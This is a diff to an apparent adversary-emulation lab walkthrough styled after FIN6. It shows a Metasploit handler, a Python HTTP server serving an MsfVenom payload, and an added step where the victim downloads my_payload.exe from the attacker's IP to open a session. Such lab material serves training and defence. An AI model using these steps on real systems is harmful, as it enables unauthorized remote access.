@@ -101,7 +101,6 @@ To start the handler, just execute the following command.
 msf6 exploit(multi/handler) > exploit
 ```
 
-
 ### 1.4 - Tranfser the Payload via Server
 
 Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
@@ -112,10 +111,19 @@ Open another terminal tab, then navigate to the folder location of the payload:
 cd /tmp/
 ```
 
-start a Python3 HTTP server on port 80:
+Start a Python3 HTTP server on port 80:
 
 ```bash
 sudo python3 -m http.server 80
+```
+
+### 1.4 - Download Payload to Start the Communication on Exploit Handler
+
+Switch to the victim's Server. Open a browser and navigate to to the following address to download the payload to the Desktop. Make sure to replace
+the IP address placeholder with the IP address of the attackerVM:
+
+```
+http://[Attacker IP]/tmp/my_payload.exe
 ```
 
 ## Step 2 - FIN6 Discovery
